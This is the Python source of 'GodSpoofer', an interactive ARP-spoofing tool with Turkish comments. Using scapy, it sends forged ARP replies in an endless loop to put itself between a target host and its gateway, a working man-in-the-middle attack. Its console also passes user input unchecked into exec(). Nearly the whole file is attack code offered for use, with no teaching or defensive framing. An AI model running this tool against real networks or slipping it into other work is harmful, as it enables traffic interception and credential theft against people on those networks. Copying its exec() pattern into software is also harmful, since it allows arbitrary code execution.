import time
from scapy.all import ARP, send
import os
from threading import Thread
try:
    os.system("cls")
except:
    os.system("clear")

def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac):
    while True:
        # Hedefi router gibi göster
        packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        send(packet1, verbose=False)
        
        # Router'ı hedef gibi göster
        packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        send(packet2, verbose=False)
        

def spoof_installer():
    npcapinstalquest = input("Npcap-1.81 install (Y/n)")
    if npcapinstalquest != "n":
        os.startfile("npcap-1.81.exe")
        cont = input("continue...(press any key)")
    with open("reg","w") as f:
        f.write("1")
    entence()


class gspc:
    def __init__(self):
        pass
    def help(self):
        helpdata = """
searchint
spoof
help
"""
        return helpdata
    def searchint(self):
        res = os.popen("arp -a").read()
        return res
    def spoof(self):
        target_ip = input("Targetip>>")
        gateway_ip = input("Getwayip>>")

        target_mac = input("Targetmac>>")  # ARP tablosundan aldığın MAC
        gateway_mac = input("Getwaymac>>")
        print(f"✅ Started Spoof: {target_ip} ↔ {gateway_ip}")
        th = Thread(target=arp_spoof, args=(target_ip, target_mac, gateway_ip, gateway_mac,))
        th.start()
    def clear(self):
        try:
            os.system("cls")
        except:
            os.system("clear")

        print(banner)


banner = r"""
 _____ ___________   ___________ _____  ___________ ___________ 
|  __ \  _  |  _  \ /  ___| ___ \  _  ||  _  |  ___|  ___| ___ \
| |  \/ | | | | | | \ `--.| |_/ / | | || | | | |_  | |__ | |_/ /
| | __| | | | | | |  `--. \  __/| | | || | | |  _| |  __||    / 
| |_\ \ \_/ / |/ /  /\__/ / |   \ \_/ /\ \_/ / |   | |___| |\ \ 
 \____/\___/|___/   \____/\_|    \___/  \___/\_|   \____/\_| \_|
"""



def entence():
    try:
        with open("reg","r") as f:
            a = f.read()
        if a == "1":
            print("Installation confirmed...")
        else:
            print("Starting the installation...")
            time.sleep(3)
            spoof_installer()
    except:
        print("Starting the installation...")
        time.sleep(3)
        spoof_installer()

print(banner)
print("\n\n\n")

print("Hello, Well Come God Spoofer")

print("Checking the entrance...")

entence()

print("Starting GodSpoofer")

time.sleep(3)


try:
    os.system("cls")
except:
    os.system("clear")
time.sleep(2)
print(banner)

print("Hello, Well Come God Spoofer")


while True:
    gspconsole = input("gspconsole>>")
    consolepanel = gspc()
    gspconsole = f"consolepanel.{gspconsole}"
    #relase:
    try:
        exec(f"print({gspconsole}())")
    except:
        print("Command Not Faud Please Write help")
    #debug:
    #exec(f"print({gspconsole}())")
